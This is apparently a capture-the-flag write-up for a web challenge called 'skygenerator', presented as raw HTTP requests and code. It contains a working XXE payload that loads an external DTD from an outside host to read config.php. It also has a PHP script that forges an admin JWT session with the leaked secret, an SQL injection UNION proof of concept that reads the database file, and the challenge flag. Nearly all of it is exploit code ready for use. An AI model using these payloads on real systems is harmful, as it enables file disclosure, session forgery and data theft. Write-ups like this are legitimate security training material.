Task: https://challs.m0lecon.it:8000

```
POST /dashboard HTTP/1.1
Host: challs.m0lecon.it:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------248456318539574999624078575176
Content-Length: 546
Origin: https://challs.m0lecon.it:8000
Connection: close
Referer: https://challs.m0lecon.it:8000/dashboard
Cookie: AUTH_BEARER_default=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1OTAyNjE5MTIsImp0aSI6Ilp5NlRReUVpOGMyUGVUVXpMQW9ISGVWTjdtN0p1dVo1eHNsTXhKdkRGejQ9IiwiaXNzIjoic2t5Z2VuZXJhdG9yIiwibmJmIjoxNTkwMjYxOTEyLCJleHAiOjE1OTAyNjU1MTIsImRhdGEiOiJpZHxpOjE7cm9sZXxzOjQ6XCJ1c2VyXCI7In0.4en2bqjgngFA0ZHz0bC3yqRJxR7TkQYUUiGCM0v3f6f5DSWd8hFjkazfIUeyA-10CDtvi2V_fGpc0RgG1ROpTg
Upgrade-Insecure-Requests: 1

-----------------------------248456318539574999624078575176
Content-Disposition: form-data; name="skyFile"; filename="template.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE cdl [
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % r SYSTEM "file:///var/www/html/skygenerator/public/config.php">
<!ENTITY % asd SYSTEM "http://empty.jack.su:8088/check.dtd">
%asd;]>
<sky>
    <star x="0" y="0">&rrr;</star>
</sky>
-----------------------------248456318539574999624078575176--
```

File structure:
```
.cache
.processing
html
	skygenerator
		composer.json
		composer.lock
		data
			skygenerator.db - database
		generatesky
			data
				godstar.png
			generatesky.pde
		public
			.htaccess
			admin_dashboard.php
			config.php
			dashboard.php
			index.php
			login.php
			logouts.php
			partials
			register.php
			sky
			style.ss
			templalte.xml
		README.md
		vendor
sketchbook
	examples
	libraries
	modes
	templates
	tools
```


```php -f composer.phar require "byjg/jwt-session=2.0.*"```

Creating Admin SESSION:

```
<?php

var_dump($_GET);

include "vendor/autoload.php";

$sessionConfig = (new \ByJG\Session\SessionConfig('skygenerator'))
    ->withSecret('Vb8lckQX8LFPq45Exq5fy2TniLUplKGZXO2')
    ->withTimeoutMinutes(500);   // You can use withTimeoutHours(1)

$handler = new \ByJG\Session\JwtSession($sessionConfig);
session_set_save_handler($handler, true);
session_start();
$_SESSION["id"] = 1;
$_SESSION["role"] = "admin";
```

SQL Injection

Admin_dashboard.php

```
...
$db = new SQLite3("../data/skygenerator.db");
$db->enableExceptions(true);
$base_query = "SELECT fiename FROM skies WHERE user_id=:user_id";

foreach (array_keys($_POST) as $key){
	if ($key 1= "user_id"){
		$base_query .= "AND $key=:$key";
	}
}
...
```

PoC:
```
POST /admin_dashboard HTTP/1.1
Host: challs.m0lecon.it:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 152
Origin: https://challs.m0lecon.it:8000
Connection: close
Referer: https://challs.m0lecon.it:8000/admin_dashboard.php
Cookie: AUTH_BEARER_default=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1OTAyNjIyOTksImp0aSI6IkgydWpHRFVLY1QzQUNVbElGQTRLMzVXcGR1OXBZNmVTNHRlNHE5bm9LSUE9IiwiaXNzIjoic2t5Z2VuZXJhdG9yIiwibmJmIjoxNTkwMjYyMjk5LCJleHAiOjE1OTAyNjU4OTksImRhdGEiOiJpZHxpOjE7cm9sZXxzOjU6XCJhZG1pblwiOyJ9.KAYoQUwD6ld2ZX-fQzON50mJlU-7bDTc6aMyvPO4RZkwl0SncWXJvPHmREa_RBpqZflbI20kOAj4GPj03dZTaQ
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

user_id=1&1%3d2/*aa*/UNION/*aa*/SELECT/*aa*/X'2f7661722f7777772f68746d6c2f736b7967656e657261746f722f646174612f736b7967656e657261746f722e6462'/*aa*/--=id
```

Flag: `ptm{XSS_4r3_b4d_sh1t_YN8aSUf8m0E8}`